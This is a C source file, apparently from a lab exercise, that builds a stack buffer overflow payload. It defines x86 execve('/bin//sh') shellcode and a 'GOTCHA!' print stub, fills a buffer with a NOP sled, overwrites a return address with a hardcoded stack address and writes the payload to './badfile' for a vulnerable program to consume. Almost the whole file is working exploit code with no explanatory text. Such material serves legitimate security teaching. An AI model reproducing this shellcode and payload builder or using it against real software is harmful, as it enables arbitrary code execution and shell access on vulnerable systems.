#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

char printcode[] =
"\xeb\x16"      /* jmp string   */
"\x31\xdb"      /* xor ebx ebx */
"\x31\xd2"      /* xor edx edx */
"\x31\xc0"      /* xor eax eax */
"\x59"          /* pop ecx */
"\xbb\x01\x00\x00\x00"  /* mov $0x1, ebx */
"\xb2\x09"      /* mov 0x9 dl */
"\xb0\x04"      /* mov 0x04 al */
"\xcd\x80"      /* int 0x80 */
"\xb0\x01"      /* mov 0x1 al */
"\xcd\x80"      /* int 0x80 */
"\xe8\xe5\xff\xff\xff" /* call code */
"GOTCHA!\n"
;

char simples[] =
"\xb0\x01"      /* mov 0x1 al */
"\xcd\x80"      /* int 0x80 */
;

#define OFFSET 1500

unsigned long get_ESP(void)
{
    __asm__("movl %ESP,%EAX");
}

int main(int argc, char **argv)
{
    unsigned long addr;
    FILE *badfile;
    char buffer[1024];

    addr = get_ESP();
    printf("%x\n\n", addr);
    addr = addr+OFFSET;

    fprintf(stderr, "Using Offset: 0x%x\nShellcode Size:%d\n", 
        addr, sizeof(printcode)); //shellcode / simples

    memset(&buffer, 0x00000090, 1024);

    /*buffer[24] = addr & 0x000000ff; 
    buffer[25] = (addr & 0x0000ff00) >> 8;
    buffer[26] = (addr & 0x00ff0000) >> 16;
    buffer[27] = (addr & 0xff000000) >> 24;*/
    buffer[24] = 0x20;//shellcode exato
    buffer[25] = 0xf2;
    buffer[26] = 0xff;
    buffer[27] = 0xbf;
    /*buffer[24] = 0x9b ;//804869b - print_overflow
    buffer[25] = 0x86;
    buffer[26] = 0x04;
    buffer[27] = 0x08;*/

    //memcpy (&buffer[(sizeof(buffer) - 
    //    sizeof(simples))],simples,sizeof(simples)); //shellcode / simples
    memcpy (&buffer[28],shellcode,sizeof(shellcode));

    badfile = fopen("./badfile", "w");
    fwrite(buffer,1024,1,badfile);
    fclose(badfile);

    return 0;
}

